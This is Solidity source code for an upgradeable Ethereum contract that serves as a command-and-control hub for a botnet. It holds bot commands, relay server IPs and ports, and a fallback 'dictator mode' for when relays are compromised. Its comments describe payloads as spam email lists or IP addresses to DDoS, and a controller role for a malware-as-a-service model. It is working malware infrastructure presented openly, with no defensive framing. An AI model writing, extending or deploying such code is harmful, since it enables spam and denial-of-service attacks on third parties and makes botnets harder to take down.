// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma abicoder v2;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ConsulUpgradeable is Initializable, UUPSUpgradeable, AccessControlUpgradeable {
    using SafeMath for uint256;

    bytes32 public constant OWNER_ROLE = keccak256("OWNER_ROLE");
    bytes32 public constant CONTROLLER_ROLE = keccak256("CONTROLLER_ROLE");

    /**
     * @dev When dictator mode is enabled the servi will only execute
     * with this contract. This is useful redundancy in case the praeators
     * are compromised. This will come at the cost of increased gas costs
     * and most likely a reduction in features and capabilities. This will
     * however allow the owner to maintain control of the servi, until
     * preators are restored in the provinces.
     */
    bool internal dictatorMode = false;

    /**
     * @dev Set the current command to default to REPORT on deployment
     * NOTE: As the servi are deployed from resourses the owner controls
     * we can assume they will know what the corrasponding hash means
     */
    bytes32 internal currentCommand = keccak256("REPORT");

    /**
     * @dev Histroical record of commands
     */
    bytes32[] internal commandHistory;

    /**
     * @dev A mapping of payloads to be executed by the servus
     * these could be email list for spamming, or a list of
     * ip addresses to be ddosed.
     * This is for dictator mode
     */
    mapping(bytes32 => bytes[]) internal payloads;

    /**
     * @dev Struct to hold the details of a praetor server
     * @param ip The ip address of the server
     * @param port The port the server is listening on
     */
    struct Server {
        string ip;
        uint256 port;
    }

    /**
     * @dev Struct to hold the details of a praetor node
     * @param ip The ip address of the node
     * @param port The port the node is listening on
     */
    struct Node {
        string ip;
        uint256 port;
    }

    /**
     * @dev Struct to hold the details of a praetor
     * @param id The id of the praetor, probably a hash of the server details or a fun Roman reference
     * @param Server The struct containing the details of the server
     * @param Node The struct containing the details of the node
     * @param active A boolean to indicate if the praetor is active
     */
    struct Praetor {
        bytes32 id;
        Server server;
        Node node;
        bool active;
    }

    /**
     * @dev Array of praetor structs
     */
    Praetor[] internal praetors;

    modifier onlyOwner() {
        require(hasRole(OWNER_ROLE, msg.sender), "Address does not have owner permission");
        _;
    }

    /**
     * @dev Controller role is used to allow the owner to delegate control
     * to a third party. This is useful for allowing a third party to
     * manage the contract without having to give them ownership.
     * This allows a MaaS modle to be adopted.
     */
    modifier onlyController() {
        require(
            hasRole(CONTROLLER_ROLE, msg.sender) || hasRole(OWNER_ROLE, msg.sender),
            "Address does not have controller permission"
        );
        _;
    }

    /**
     * @dev Event for the change of the current command
     */
    event CommandChanged(bytes32 indexed command);

    /**
     * @dev Event for the addition of a new praetor
     */
    event PraetorAdded(bytes32 indexed praetorId);

    /**
     * @dev Event for the removal of a praetor
     */
    event PraetorRemoved(bytes32 indexed praetorId);

    /**
     * @dev Event for the deactivation of a praetor
     */
    event PraetorDeactivated(bytes32 indexed praetorId);

    /**
     * @dev Event for the instatution of dictator mode
     */
    event DictatorModeEnabled(bool indexed dictatorMode);

    function initialize() public initializer {
        _setupRole(OWNER_ROLE, msg.sender);
        _setRoleAdmin(OWNER_ROLE, OWNER_ROLE);
        _setRoleAdmin(CONTROLLER_ROLE, OWNER_ROLE);
        __UUPSUpgradeable_init();
    }

    /**
     * @dev Allows the owner to transfer ownership to a new address
     * @param newOwner The address of the new owner
     */
    function transferOwnership(address newOwner) external onlyOwner {
        grantRole(OWNER_ROLE, newOwner);
        revokeRole(OWNER_ROLE, msg.sender);
    }

    /**
     * @dev Returns all current praetors
     */
    function getPraetors() external view returns (Praetor[] memory) {
        return praetors;
    }

    /**
     * @dev Allows the owner to add a new praetor
     * @param id The id of the praetor
     * @param serverIp The ip address of the server
     * @param serverPort The port the server is listening on
     * @param nodeIp The ip address of the node
     * @param nodePort The port the node is listening on
     * @return bool
     */
    function addPraetor(
        bytes32 id,
        string memory serverIp,
        uint256 serverPort,
        string memory nodeIp,
        uint256 nodePort
    ) external onlyOwner returns (bool) {
        praetors.push(
            Praetor({
                id: id,
                server: Server({ ip: serverIp, port: serverPort }),
                node: Node({ ip: nodeIp, port: nodePort }),
                active: true
            })
        );
        emit PraetorAdded(id);
        return true;
    }

    /**
     * @dev Allows the owner to remove a praetor
     * @param index The index of the praetor to be removed
     * @return bool
     */
    function removePraetor(uint256 index) external onlyOwner returns (bool) {
        require(index < praetors.length, "Index is out of bounds of the praetors array");
        emit PraetorRemoved(praetors[index].id);
        delete praetors[index];
        return true;
    }

    /**
     * @dev Allows the owner to deactivate a praetor
     * @param index The index of the praetor to be deactivated
     * @return bool
     */
    function deactivatePraetor(uint256 index) external onlyOwner returns (bool) {
        require(index < praetors.length, "Index is out of bounds of the praetors array");
        praetors[index].active = false;
        emit PraetorDeactivated(praetors[index].id);
        return true;
    }

    /**
     * @dev Allows controllers to change the current command
     * and add the prevous command to the command history
     * @param command The new command to be set
     * @return bool
     */
    function changeCommand(bytes32 command) external onlyController returns (bool) {
        commandHistory.push(currentCommand);
        currentCommand = command;
        emit CommandChanged(command);
        return true;
    }

    /**
     * @dev Returns the current command
     * @return bytes32
     */
    function getCurrentCommand() external view returns (bytes32) {
        return currentCommand;
    }

    /**
     * @dev Returns command from the command history by index
     * @param index The index of the command to be returned
     * @return bytes32
     */
    function getCommandHistory(uint256 index) external view returns (bytes32) {
        return commandHistory[index];
    }

    /**
     * @dev Returns the length of the command history
     * @return uint256
     */
    function getCommandHistoryLength() external view returns (uint256) {
        return commandHistory.length;
    }

    /**
     * @dev Returns the state of the dictatorship
     */
    function getDictatorMode() external view returns (bool) {
        return dictatorMode;
    }

    /**
     * @dev Allows owner to toggle dictator mode
     */
    function toggleDictatorMode() external onlyOwner {
        dictatorMode = !dictatorMode;
        emit DictatorModeEnabled(dictatorMode);
    }

    /**
     * @dev Returns payload
     * @param _payloadId The id of the payload
     */
    function getPayload(bytes32 _payloadId) external view returns (bytes[] memory) {
        return payloads[_payloadId];
    }

    /**
     * @dev Allows controllers to add a payload as long as it doesn't write
     * over an existing payload
     */
    function addPayload(bytes32 _payloadId, bytes[] memory _payload) external onlyController {
        require(payloads[_payloadId].length == 0, "Payload already exists");
        payloads[_payloadId] = _payload;
    }

    /**
     * @dev Allows owner to remove a payload
     */
    function removePayload(bytes32 _payloadId) external onlyOwner {
        delete payloads[_payloadId];
    }

    /** @dev Protected UUPS upgrade authorization fuction */
    function _authorizeUpgrade(address) internal override onlyOwner {}
}
